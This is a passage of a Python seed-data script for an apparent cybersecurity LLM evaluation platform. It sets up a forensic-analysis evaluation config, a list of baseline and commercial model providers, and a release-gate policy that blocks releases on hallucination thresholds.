    # 4. Create Standard Evaluation Config
    config = EvaluationConfig(
        name="Enterprise Cybersecurity Standard Rubric v1",
        description="Standard 6-dimension evaluation rubric with critical hallucination gates.",
        temperature=0.0,
        max_tokens=2048,
        system_prompt=(
            "You are a principal cybersecurity incident response forensic specialist. "
            "Analyze the provided incident narrative and structured evidence logs. "
            "Deliver a JSON assessment identifying verified claims, MITRE ATT&CK techniques, "
            "critical attack paths, actionable remediations, and explicit uncertainty gaps. "
            "Ground every claim strictly in the provided telemetry."
        ),
        repeat_runs=1,
    )
    session.add(config)

    # 5. Create Model Providers (Built-in + API stubs)
    providers = [
        ModelProvider(
            name="baseline-ground-truth-v1",
            display_name="CyberEval Ground Truth Forensic Expert",
            provider_type="built_in",
            model_identifier="ground-truth-v1",
        ),
        ModelProvider(
            name="baseline-competent-v1",
            display_name="Baseline Security Analyst (Competent)",
            provider_type="built_in",
            model_identifier="competent-v1",
        ),
        ModelProvider(
            name="baseline-hallucinating-v1",
            display_name="Flawed LLM (Hallucinating / Ungrounded)",
            provider_type="built_in",
            model_identifier="hallucinating-v1",
        ),
        ModelProvider(
            name="baseline-overconfident-v1",
            display_name="Flawed LLM (Overconfident / Calibration Deficit)",
            provider_type="built_in",
            model_identifier="overconfident-v1",
        ),
        ModelProvider(
            name="openai/gpt-4o",
            display_name="OpenAI GPT-4o",
            provider_type="openai",
            model_identifier="gpt-4o",
        ),
        ModelProvider(
            name="anthropic/claude-3-5-sonnet-20241022",
            display_name="Anthropic Claude 3.5 Sonnet",
            provider_type="anthropic",
            model_identifier="claude-3-5-sonnet-20241022",
        ),
        ModelProvider(
            name="gemini/gemini-1.5-pro",
            display_name="Google Gemini 1.5 Pro",
            provider_type="gemini",
            model_identifier="gemini-1.5-pro",
        ),
    ]
    for p in providers:
        session.add(p)

    # 6. Create Release Gate Policy
    policy = ReleaseGatePolicy(
        name="strict-enterprise-gate",
        description="Blocks CI/CD release if unsupported claim rate exceeds 15% or any critical hallucination trap is hit.",
        max_tolerated_score_drop=0.03,
        max_unsupported_claim_rate=0.15,
        max_regressed_scenarios=1,
        require_zero_hallucination_traps=True,
        is_active=True,
    )
    session.add(policy)

    await session.commit()
    logger.info("CyberEval seed data successfully populated!")
